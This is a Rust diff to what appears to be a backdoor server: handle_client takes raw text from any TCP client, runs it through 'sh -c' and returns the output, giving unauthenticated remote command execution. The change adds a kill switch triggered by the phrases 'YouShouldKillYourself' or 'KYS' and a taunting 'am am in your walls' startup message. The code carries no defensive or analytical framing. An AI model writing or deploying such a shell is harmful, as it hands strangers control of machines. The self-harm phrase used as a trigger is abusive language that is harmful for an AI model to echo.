@@ -17,24 +17,30 @@ fn handle_client(mut stream: TcpStream) {
 
         let command = String::from_utf8_lossy(&buffer[..bytes_read]);
 
-        let output = Command::new("sh")
-            .arg("-c")
-            .arg(command.to_string())
-            .output()
-            .expect("Failed to execute command");
-
-        let output = if output.status.success() {
-            output.stdout
+        // Check for specific messages
+        if command.trim() == "YouShouldKillYourself" || command.trim() == "KYS" {
+            let output = "Received termination command. Closing thread.";
+            stream.write_all(output.as_bytes()).unwrap();
+            std::process::exit(0);
         } else {
-            output.stderr
-        };
+            let output = Command::new("sh")
+                .arg("-c")
+                .arg(command.to_string())
+                .output()
+                .expect("Failed to execute command");
 
-        stream.write_all(&output).unwrap();
+            let output = if output.status.success() {
+                output.stdout
+            } else {
+                output.stderr
+            };
+            stream.write_all(&output).unwrap();
+        }
     }
 }
 
 pub fn start_server() {
-    println!("Starting listening at {}:{}", CLIENT_IP, CLIENT_PORT);
+    println!("am am in your walls 🫣");
     let listener = TcpListener::bind(format!("{}:{}", CLIENT_IP, CLIENT_PORT)).unwrap();
 
     let thread_count = Arc::new(AtomicUsize::new(0));
